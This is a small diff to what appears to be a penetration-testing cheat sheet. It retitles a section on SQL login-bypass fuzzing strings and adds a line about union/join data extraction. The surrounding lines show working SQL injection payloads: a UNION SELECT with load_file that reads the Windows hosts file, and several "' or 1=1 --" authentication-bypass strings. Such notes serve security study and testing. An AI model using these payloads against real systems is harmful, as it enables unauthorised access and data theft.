@@ -91,7 +91,7 @@ SQL Injection Reading a File
 union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
 ```
 
-SQL Fuzzing Strings
+SQL Logon Bypass Fuzzing Strings
 
 ```SQL
 ' or 1=1 LIMIT 1 --
@@ -101,6 +101,11 @@ SQL Fuzzing Strings
 ' or 1=1 --
 ' or 1=1 -- -
 ```
+
+We can manually extract data from an SQL Injection using union/join.
+
+
+
 ---
 
 ## Cross Site Scripting XSS
